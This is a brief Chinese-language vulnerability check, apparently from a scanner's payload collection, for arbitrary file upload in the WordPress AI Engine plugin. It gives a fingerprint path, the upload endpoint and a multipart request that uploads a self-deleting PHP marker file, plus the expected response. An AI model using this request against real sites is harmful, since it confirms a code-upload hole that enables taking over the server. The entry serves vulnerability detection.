# WordpressAIEngine插件任意文件上传

WordPress ｜ 文件上传 ｜ —
- **指纹**：`"wp-content/plugins/ai-engine/"`
- **请求**：`POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1`

**Payload**
```
--------------------------7bghbgerugy87gerbuy
Content-Disposition: form-data; name="file"; filename="dudesuite.php"
Content-Type: text/plain
<?php echo "DudeSuite";unlink(__FILE__); ?>
--------------------------7bghbgerugy87gerbuy--
```
- **响应特征**：200 dudesuite